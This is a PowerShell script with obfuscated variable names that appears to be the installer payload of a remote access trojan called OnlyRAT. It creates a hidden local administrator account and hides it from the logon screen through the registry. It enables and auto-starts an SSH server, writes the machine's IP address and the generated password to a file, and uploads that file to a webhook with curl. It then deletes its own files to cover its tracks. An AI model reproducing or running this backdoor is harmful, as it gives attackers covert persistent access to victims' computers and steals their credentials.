# TODO: incorporate necessary payload installs

function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $sqbXFdLvyw -Value 0 -Type DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote host
Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote port
Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type

# send file to webhook
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
curl.exe -F "payload_json={\`"username\`": \`"onlyrat\`", \`"content\`": \`"download me\`"}" -F "file=@$env:username.rat" $PEBgxuJUfd
# Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
# Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"

# cleanup
attrib +h +s +r C:/Users/onlyrat 
Remove-Item $CRYnrkaDbe
Remove-Item lawFvVTikZ.txt
Remove-Item KFPGaEYdcz.ps1